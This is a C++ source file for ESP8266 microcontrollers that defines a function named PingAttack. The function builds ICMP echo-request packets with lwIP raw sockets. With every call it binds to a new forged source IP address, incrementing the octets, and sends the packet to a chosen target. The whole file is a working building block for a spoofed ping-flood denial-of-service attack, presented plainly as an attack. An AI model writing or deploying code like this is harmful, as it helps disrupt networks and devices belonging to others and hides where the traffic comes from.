
#include "pinger.h"
#ifndef __ORIGINAL_PINGER__
#include <Esp.h>
#include <lwip/ip_addr.h>
    

#include "core_version.h"

extern "C"
{
  #include <netif/etharp.h> // required for eth_addr
  #include <lwip/icmp.h> // needed for icmp packet definitions
  #include <lwip/inet_chksum.h> // needed for inet_chksum()
  #include <lwip/sys.h> // needed for sys_now()
}

#endif


void PingAttack(IPAddress ip, int packetId, int echoPayloadLen)
{
  // Changing the IP every time a new packet is sent
  static unsigned short int octet_1 = 1;
  static unsigned short int octet_2 = 89;
  static unsigned short int octet_3 = 249;
  static unsigned short int octet_4 = 154;

 struct ip_addr newAddress;
  IP4_ADDR(&newAddress,octet_1,octet_2,octet_3,octet_4); // Set local = "127.0.0.1"
  octet_4++;
  if(octet_4==255){
    octet_4 = 1;
    octet_3++;
  }

  if(octet_3==255){
    octet_3 = 1;
    octet_2++;
  }
  if(octet_2==255){
    octet_2 = 1;
    octet_1++;
  }
  if(octet_1==255){
    octet_1 = 1;
  }
  
//  ///////////////////////////

  struct raw_pcb * IcmpProtocolControlBlock= nullptr;
 
    // Create new ICMP detection data
    IcmpProtocolControlBlock = raw_new(IP_PROTO_ICMP);
    if(IcmpProtocolControlBlock == nullptr)
    {
      return ;

  }
  raw_bind(IcmpProtocolControlBlock, &newAddress);
  // Init response fields for current request
  u16_t EchoMessageSize = echoPayloadLen + 
    sizeof(struct icmp_echo_hdr);
  
  // Allocate packet buffer structure. Buffer memory is allocated as one 
  // large chunk. This includes protocol headers as well.
  struct pbuf * packetBuffer = pbuf_alloc(
    PBUF_IP,
    EchoMessageSize,
    PBUF_RAM);
  if(packetBuffer == nullptr)
  {
    return;
  }
  
  // Check if packet buffer correctly created
  if((packetBuffer->len != packetBuffer->tot_len) ||
    (packetBuffer->next != nullptr))
  {
    // Free packet buffer memory and exit
    pbuf_free(packetBuffer);
    return;
  }

  // Build echo request packet
  struct icmp_echo_hdr * echoRequestHeader =
    (struct icmp_echo_hdr *)packetBuffer->payload;
  ICMPH_TYPE_SET(echoRequestHeader, ICMP_ECHO);
  ICMPH_CODE_SET(echoRequestHeader, 0);
  echoRequestHeader->chksum = 0;
  echoRequestHeader->id = packetId;
  static u32_t SequenceNumber {0};
  ++(SequenceNumber);
  if (SequenceNumber == 0x7fff)
  {
    SequenceNumber = 0;
  }
  echoRequestHeader->seqno = htons(SequenceNumber);

  size_t icmpHeaderLen = sizeof(struct icmp_echo_hdr);
  size_t icmpDataLen = EchoMessageSize - icmpHeaderLen;

  // Just after icmp echo request header, append payload bytes to reach
  // the specified packed dimension
  char dataByte = 0x61; // 'a' character
  for(size_t i = 0; i < icmpDataLen; i++)
  {
    ((char*)echoRequestHeader)[icmpHeaderLen + i] = dataByte;
    ++dataByte;
    if(dataByte > 0x77) // 'w' character
    {
      dataByte = 0x61;
    }
  }

  // Evaluate and set packet checksum
  echoRequestHeader->chksum = inet_chksum(echoRequestHeader,
    EchoMessageSize);

  // Finally, send the packet and register timestamp
  ip_addr_t destIPAddress;
  destIPAddress.addr = ip;
  raw_sendto(IcmpProtocolControlBlock, packetBuffer, &destIPAddress);
  pbuf_free(packetBuffer);
  raw_remove(IcmpProtocolControlBlock);
  IcmpProtocolControlBlock = nullptr;

}
